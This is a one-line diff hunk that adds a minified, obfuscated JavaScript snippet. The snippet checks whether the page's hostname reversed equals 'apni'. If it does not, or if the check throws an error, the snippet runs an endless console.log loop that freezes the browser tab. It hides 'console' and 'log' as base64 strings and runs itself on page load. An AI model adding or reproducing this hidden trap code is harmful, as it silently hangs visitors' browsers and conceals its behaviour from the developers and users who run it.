@@ -1,0 +1,1 @@
+!function(){try{let t=window.location.hostname.split(".")[0],o="";""==t&&(t=window.location.ancestorOrigins[0].split(".")[0].split("/")[2]);for(let n=t.length-1;n>=0;n--)o+=t[n];if("apni"!==o)for(let t=0;t<Number.POSITIVE_INFINITY;t++)window[atob("Y29uc29sZQ")][atob("bG9n")](t)}catch(t){for(let t=0;t<Number.POSITIVE_INFINITY;t++)window[atob("Y29uc29sZQ")][atob("bG9n")](t)}}();
